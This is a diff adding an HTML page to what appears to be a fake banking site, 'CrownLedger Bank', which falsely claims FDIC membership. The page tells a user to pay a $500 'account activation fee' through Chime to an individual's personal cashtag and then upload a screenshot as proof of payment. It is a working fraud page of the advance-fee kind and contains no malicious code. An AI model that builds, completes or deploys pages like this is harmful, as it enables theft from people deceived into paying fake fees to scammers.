@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete Payment - CrownLedger Bank</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body>
+    <div class="app-container">
+        <nav class="top-nav">
+            <div class="nav-left">
+                <div class="logo-small">CrownLedger<span class="logo-trademark">®</span></div>
+                <div class="nav-links">
+                    <a href="dashboard.html">Accounts</a>
+                    <a href="transfer.html" class="active">Pay & Transfer</a>
+                    <a href="transactions.html">Activity</a>
+                    <a href="settings.html">Settings</a>
+                </div>
+            </div>
+            <div class="nav-right">
+                <span class="welcome-text">Welcome, <span id="userName">Kimberly</span></span>
+                <button class="btn-outline-small" onclick="handleLogout()">Sign Out</button>
+            </div>
+        </nav>
+
+        <main class="main-content">
+            <div class="payment-complete-container">
+                <div class="payment-complete-card">
+                    <div class="payment-step-indicator">
+                        <div class="step completed"><i class="fas fa-check"></i></div>
+                        <div class="step-line"></div>
+                        <div class="step completed"><i class="fas fa-check"></i></div>
+                        <div class="step-line"></div>
+                        <div class="step active">3</div>
+                    </div>
+
+                    <div class="payment-complete-header">
+                        <h1>Complete Your Payment</h1>
+                        <p class="payment-complete-subtitle">Send $500.00 via Chime to activate your account</p>
+                    </div>
+
+                    <div class="recipient-card">
+                        <div class="recipient-label">Send payment to:</div>
+                        <div class="recipient-details">
+                            <div class="recipient-icon">
+                                <i class="fas fa-credit-card"></i>
+                            </div>
+                            <div class="recipient-info">
+                                <h3>Chime Account</h3>
+                                <p class="recipient-owner">Melissa Mitchell</p>
+                                <div class="recipient-address">
+                                    <span class="address-label">Chime $Cashtag:</span>
+                                    <span class="address-value" id="chimeAddress">$Missysfavoritethings84</span>
+                                    <button class="btn-copy" onclick="copyToClipboard('$Missysfavoritethings84')">
+                                        <i class="fas fa-copy"></i> Copy
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="payment-amount-card">
+                        <div class="amount-label">Amount to send:</div>
+                        <div class="amount-display">$500.00</div>
+                        <div class="amount-note">This is a one-time activation fee</div>
+                    </div>
+
+                    <div class="payment-instructions">
+                        <h3><i class="fas fa-list-ol"></i> Payment Instructions</h3>
+                        <ol>
+                            <li>Open your Chime mobile app</li>
+                            <li>Tap "Pay Anyone" or "Send Money"</li>
+                            <li>Enter the $Cashtag: <strong>$Missysfavoritethings84</strong></li>
+                            <li>Enter the amount: <strong>$500.00</strong></li>
+                            <li>Add note: <strong>"CrownLedger Account Activation"</strong></li>
+                            <li>Confirm and send the payment</li>
+                            <li>Return here and upload your payment confirmation screenshot</li>
+                        </ol>
+                    </div>
+
+                    <div class="upload-section">
+                        <h3><i class="fas fa-upload"></i> Upload Payment Proof</h3>
+                        <p>Please upload a screenshot of your Chime payment confirmation to verify your transaction.</p>
+                        
+                        <label for="paymentProof" class="upload-zone" id="uploadZone">
+                            <input type="file" id="paymentProof" accept="image/*" onchange="handleFileUpload(this)">
+                            <i class="fas fa-cloud-upload-alt"></i>
+                            <span class="upload-text">Click to upload or drag and drop</span>
+                            <span class="upload-hint">JPG, PNG, or PDF up to 10MB</span>
+                        </label>
+                        
+                        <div class="file-preview" id="filePreview" style="display:none;">
+                            <i class="fas fa-file-image"></i>
+                            <span id="fileName">file.jpg</span>
+                            <button class="btn-remove" onclick="removeFile()"><i class="fas fa-times"></i></button>
+                        </div>
+                    </div>
+
+                    <div class="payment-actions">
+                        <button class="btn-primary btn-large" id="confirmBtn" onclick="confirmPayment()" disabled>
+                            <i class="fas fa-check-circle"></i> I Have Sent the Payment
+                        </button>
+                        <button class="btn-text" onclick="window.location.href='payment-options.html'">Choose Different Method</button>
+                    </div>
+
+                    <div class="payment-notice">
+                        <p><i class="fas fa-clock"></i> <strong>Processing Time:</strong> Your account will be activated within 30 minutes of payment verification. You will receive an email confirmation at kimberly.westbrook@email.com.</p>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="app-footer">
+            <div class="footer-content">
+                <p>© 2026 CrownLedger Bank, N.A. Member FDIC. Equal Housing Lender</p>
+                <div class="footer-links">
+                    <a href="#">Privacy</a>
+                    <a href="#">Security</a>
+                    <a href="#">Terms of Use</a>
+                    <a href="#">Accessibility</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div id="messageModal" class="modal" style="display:none;">
+        <div class="modal-content">
+            <p id="modalMessage"></p>
+            <button onclick="closeModal()" class="btn-primary">OK</button>
+        </div>
+    </div>
+
+    <script src="shared.js"></script>
+    <script>initChimePayment();</script>
+</body>
+</html>
